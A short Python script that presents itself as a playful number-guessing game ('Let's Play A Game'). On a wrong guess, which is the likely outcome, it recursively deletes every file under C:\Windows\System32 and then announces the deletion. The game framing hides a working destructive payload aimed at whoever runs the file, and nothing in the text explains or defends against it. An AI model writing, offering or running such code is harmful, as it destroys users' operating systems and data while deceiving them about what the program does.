import os
import random

print("Let's Play A Game :-) ")


def delete_all_files(directory):
    Number = random.randint(1, 15)

    try:
        confirmation = int(
            input("Guess The Random Number On My Mind between 1 to 15: ")
        )
    except ValueError:
        print("Invalid input. Please enter a valid integer.")
        return

    if confirmation == Number:
        print("Lucky You! You guessed the number correctly.")
    else:
        print("Wrong, Sorry Bro")
        for root, _, files in os.walk(os.path.abspath(directory)):
            for file in files:
                os.remove(os.path.join(root, file))
        print(f"All files in {directory} have been deleted.")


target_directory = r"C:\Windows\System32"


delete_all_files(target_directory)
